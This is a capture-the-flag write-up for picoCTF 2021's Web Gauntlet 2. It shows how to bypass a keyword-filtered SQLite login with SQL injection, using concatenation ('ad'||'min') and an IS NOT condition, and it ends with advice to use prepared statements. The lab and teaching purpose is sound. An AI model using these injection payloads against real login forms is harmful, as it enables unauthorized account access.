# picoCTF 2021 – Web Gauntlet 2 Writeup

## Overview

This challenge is part of the **Web Gauntlet series** in picoCTF.  
The goal is to bypass a login form and authenticate as the **admin user**.

However, the application includes several **filters that block common SQL injection keywords**.  
The backend database used by the application is **SQLite**, which provides some alternative operators that can help bypass these filters.

**Category:** Web Exploitation  
**Difficulty:** Medium  
**Vulnerability:** Filtered SQLite SQL Injection  

---

## Challenge Description

The challenge presents a login form that requires:

- Username
- Password

The goal is to **log in as the admin user**.

However, the application filters several SQL keywords and operators that are typically used in SQL Injection attacks.

---

## Blocked Keywords

The application filters multiple SQL keywords such as:

```
OR
AND
TRUE
FALSE
=
LIKE
admin
-- (comments)
```

The challenge also **limits the maximum length of the injection payload**.

Because of these filters, traditional SQL injection payloads will not work.

Example of a typical payload that is blocked:

```sql
admin' OR 1=1 --
```

---

## Understanding the Backend Query

The backend query likely looks similar to this:

```sql
SELECT * FROM users
WHERE username='INPUT_USERNAME'
AND password='INPUT_PASSWORD'
```

To bypass authentication, we need:

1. `username = admin`
2. The password condition to evaluate as **TRUE**

---

## Bypassing the "admin" Filter

The word **admin** is filtered and cannot be written directly.

However, SQLite supports **string concatenation** using the `||` operator.

Example:

```sql
'ad' || 'min'
```

Result:

```
admin
```

This allows us to construct the admin username **without writing the word directly**.

---

## Bypassing the "=" Filter

The equality operator `=` is filtered.

SQLite provides an alternative operator:

```sql
IS
```

Example:

```sql
1 IS 1
```

Result:

```
TRUE
```

This operator behaves similarly to `=`.

---

## Constructing the Payload

### Username

We build the admin username using concatenation:

```sql
ad'||'min
```

### Password

We need to create a condition that evaluates to **TRUE** without using the filtered keywords.

The payload used in the challenge is:

```sql
' IS NOT '
```

---

## Final Payload

```
Username:
ad'||'min

Password:
' IS NOT '
```

---

## How the Injection Works

The final SQL query becomes similar to:

```sql
SELECT * FROM users
WHERE username='ad'||'min'
AND password='' IS NOT ''
```

Evaluation:

```
username = admin
password condition = TRUE
```

Because the condition evaluates successfully, the application authenticates us as **admin**.

---

## Retrieving the Flag

After successfully logging in, the challenge displays a success message.

Next, navigate to:

```
filters.php
```

Refreshing the page reveals the flag:

```
picoCTF{...}
```

---

## Lessons Learned

This challenge demonstrates several important SQL injection concepts:

### 1. Filter bypass techniques

Even if common SQL keywords are filtered, alternative operators may exist.

### 2. SQLite-specific operators

SQLite provides unique operators such as:

```
||
IS
IS NOT
```

These operators can be used to bypass filters.

### 3. Blacklist filtering is ineffective

Blocking specific keywords does not prevent SQL injection attacks.

Attackers can still find alternative syntax.

---

## Mitigation

To prevent SQL injection vulnerabilities:

### Use prepared statements

Example in PHP:

```php
$stmt = $db->prepare("SELECT * FROM users WHERE username=? AND password=?");
$stmt->execute([$username, $password]);
```

### Avoid blacklist filtering

Filtering keywords such as `OR` or `=` is not a secure defense.

### Validate and sanitize user input

Always treat user input as untrusted.

---

## References

- picoCTF 2021
- SQLite Documentation
- OWASP SQL Injection Guide
